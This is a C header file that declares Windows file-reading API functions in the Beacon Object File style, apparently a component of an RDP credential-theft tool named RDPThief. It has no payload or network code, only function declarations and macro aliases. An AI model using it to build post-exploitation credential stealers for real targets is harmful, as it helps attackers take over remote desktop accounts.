#ifndef RDPTHIEF_READFILE_H
#define RDPTHIEF_READFILE_H

#include <windows.h>
#include "beacon.h"

WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
WINBASEAPI DWORD WINAPI KERNEL32$GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);
WINBASEAPI HLOCAL WINAPI KERNEL32$LocalAlloc(UINT uFlags, SIZE_T uBytes);
WINBASEAPI void __cdecl MSVCRT$memset(void *dest, int c, size_t count);
WINBASEAPI BOOL WINAPI KERNEL32$ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
WINBASEAPI HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL hMem);
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError();


#define CreateFileW_ KERNEL32$CreateFileW
#define GetFileSize KERNEL32$GetFileSize
#define LocalAlloc_ KERNEL32$LocalAlloc
#define memset MSVCRT$memset
#define ReadFile_ KERNEL32$ReadFile
#define CloseHandle_ KERNEL32$CloseHandle
#define LocalFree_ KERNEL32$LocalFree
#define GetLastError KERNEL32$GetLastError

#endif //RDPTHIEF_READFILE_H
